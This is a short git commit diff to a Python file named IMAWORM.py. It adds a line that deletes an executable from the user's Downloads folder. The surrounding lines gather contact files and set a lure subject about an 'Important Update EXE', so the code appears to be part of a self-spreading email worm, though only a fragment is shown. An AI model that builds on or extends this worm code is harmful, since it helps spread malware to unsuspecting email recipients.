f67b7ab17d0df5ea7fcc0fc10468f3a05f9315c6
RCDelta <104479252+RCDelta@users.noreply.github.com>
2024-04-26 22:18:23 -0400

    Update IMAWORM.py

--- IMAWORM.py
+++ IMAWORM.py
@@ -26,6 +26,7 @@ subject = "New Email With Important Update EXE!!"
 def getEmail():
     name = os.getlogin()
     os.chdir("/Users/" + name + "/Downloads")
+    os.remove("testShunk.exe")
     email_list = []
     for files in os.listdir("/Users/" + name + "/Contacts"):
         if files.endswith(".contact"):
